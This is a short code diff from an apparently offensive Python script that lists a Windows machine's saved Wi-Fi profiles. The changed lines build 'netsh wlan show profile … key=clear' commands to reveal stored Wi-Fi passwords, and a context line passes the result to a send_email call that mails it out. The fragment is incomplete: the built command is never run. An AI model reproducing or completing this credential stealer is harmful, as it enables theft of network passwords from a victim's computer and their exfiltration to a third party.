@@ -20,9 +20,9 @@ network_names_list = re.findall("(?:Profile\s*:\s) (.*)", networks)
 #findall is an RE that will return any instances of the text specified and place in list
 
 for network_name in network_names_list:
-    print(network_name)
+    command = "netsh wlan show profile " + network_name + " key=clear"
+    
 
-print(network_names)
 
 send_email(email, password, result)
 #no hardcoded creds to see here, move along creeps
